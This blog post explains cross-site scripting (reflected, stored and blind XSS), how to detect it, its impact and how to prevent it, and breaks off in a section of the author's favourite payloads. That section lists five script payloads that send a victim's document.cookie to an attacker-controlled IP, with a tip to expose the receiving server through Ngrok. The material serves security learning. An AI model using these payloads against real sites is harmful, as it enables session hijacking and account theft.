---
title: "XSS Vulnerabilities Made Eazyypezyyy"
date: 2024-04-08T23:15:00+07:00
slug: XSS
category: blog 
summary:
description: 
cover:
  image:
  alt:
  caption: 
  relative: true
showtoc: true
draft: false
---

# How Stored XSS Vulnerabilities Can Lead to Cookie Theft 😶‍🌫️

## What is XSS?
Cross-Site Scripting (XSS) is a common web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by users. XSS can lead to various security issues, including session hijacking and data theft. To protect against XSS, developers should implement robust input validation techniques and utilize security encoding libraries, which help sanitize HTML and prevent these attacks.

## Types of XSS Attacks

- **Reflected XSS**: Imagine an attacker sends you a malicious link, perhaps in a phishing email. When you click that link, your browser sends your cookies to the attacker, giving them access to your session. It’s like opening the door to your house because someone knocked and said they were your friend!

- **Stored XSS**: This one is a bit sneakier. Here, the malicious script is stored directly in the website’s database. When you or anyone else visits that page, the script runs automatically. This typically happens when the site doesn’t clean up user input properly. If a user submits a dangerous payload in a sign-up form, and the site doesn’t sanitize it, it’ll execute every time someone visits the affected page.

- **Blind XSS**: In Blind XSS, the attacker hides their payload on the server, often through forms or feedback submissions. The tricky part? The payload doesn’t execute until an admin or another user views it later. So, it’s like setting a trap that only someone else will trigger!

## Common Entry Points for XSS
You’ll often find XSS vulnerabilities in places like:

- Registration forms
- Comment sections
- Search fields (This one is my fav! 😊)

## Testing for Blind XSS
To check for Blind XSS, you can inject simple scripts, like alerts, into input fields. If the script doesn’t run right away, it might mean it’s a Blind XSS vulnerability, waiting for someone else to activate it.

## The Cookie Theft Connection
One of the main goals of Blind XSS is to steal cookies. Attackers might encode the cookie in Base64 and send it to their server. For example, they could use `btoa()` to send the cookie data over.

## How to Detect XSS
Detecting XSS can be as simple as injecting a payload that runs JavaScript in your browser. The classic method is using the `alert()` function. However, since Chrome has put some restrictions in place, if that doesn’t work, try using `print()` instead.

## The Impact of XSS
The impact of XSS really depends on the context:

- In a public-facing app with no sensitive data, the effect might be minor.
- But if you’re dealing with sensitive information, like banking details, it can be severe.
- If an attacker gains access to an account with admin privileges, they could compromise the entire application.

## Preventing XSS Attacks
So, how can we keep our applications safe from XSS? Here are some key strategies:

- **Filter Input**: Always sanitize user input as soon as it arrives.
- **Encode Output**: Make sure data is properly encoded before it’s displayed.
- **Use Security Headers**: Implement headers to enhance security.
- **Content Security Policy (CSP)**: Use CSP to limit where content can be loaded from.

## My Favorite XSS Payloads for Cookie Theft and Keylogging
/* Use Ngrok to expose your local server since the provided IP addresses are private and not accessible from the internet. */

// Cookie Stealer Payloads

```javascript
<script>var i=new Image(); i.src="http://10.10.14.19:8000/?cookie="+btoa(document.cookie);</script>
<script>fetch('http://10.10.14.19:8000/?cookie=' + btoa(document.cookie));</script>
<script>window.location='http://10.10.14.4:8002/cookie='+document.cookie;</script>
<script>var myimg = new Image(); myimg.src='http://10.10.14.4:8002/q?=' + document.cookie;</script>
<script>document.location='http://10.10.14.19:8000/?c='+document.cookie;</script>
